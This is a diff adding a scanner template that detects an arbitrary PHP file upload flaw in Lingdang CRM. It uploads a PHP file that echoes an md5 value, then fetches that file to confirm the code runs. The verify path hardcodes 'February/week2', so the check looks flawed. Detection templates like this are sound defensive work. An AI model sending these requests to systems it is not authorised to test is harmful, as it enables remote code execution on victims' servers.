@@ -1,0 +1,58 @@
+id: poc-yaml-51mis-crm-uploadimg-anyfile-upload
+info:
+  name: Lingdang CRM Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    Detects arbitrary file upload vulnerability in Lingdang CRM allowing malicious PHP code to be uploaded and executed.
+
+variables:
+  t1: "{{rand_int(1000,9999)}}"
+  t2: "{{md5(t1)}}"
+  dt: "{{date_time('2006')}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/crm/modules/Home/multipleUpload.php?uploadtype=uploadimg"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary0Mh3BfgWszxRFokh"
+    body: |-
+      ------WebKitFormBoundary0Mh3BfgWszxRFokh
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.php"
+      Content-Type: text/plain
+
+      <?php echo md5({{t1}});?>
+      ------WebKitFormBoundary0Mh3BfgWszxRFokh
+      Content-Disposition: form-data; name="error"
+
+      UPLOAD_ERR_OK
+      ------WebKitFormBoundary0Mh3BfgWszxRFokh--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"path\""
+          - ".php"
+
+  - id: verify-file
+    method: GET
+    path:
+      - "{{BaseURL}}/crm/storage/{{dt}}/February/week2/{{t1}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
